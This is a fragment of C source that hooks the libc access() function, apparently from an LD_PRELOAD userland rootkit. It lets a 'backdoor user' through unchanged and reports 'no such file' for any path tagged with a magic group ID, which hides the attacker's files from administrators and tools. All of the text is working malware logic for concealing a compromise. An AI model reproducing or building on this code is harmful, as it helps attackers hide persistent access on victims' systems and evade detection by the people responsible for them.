int access(const char *pathname, int amode)
{
    HOOK(o_access, CACCESS);
    if(is_bdusr()) return o_access(pathname, amode);
    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return -1; }
    return o_access(pathname, amode);
}
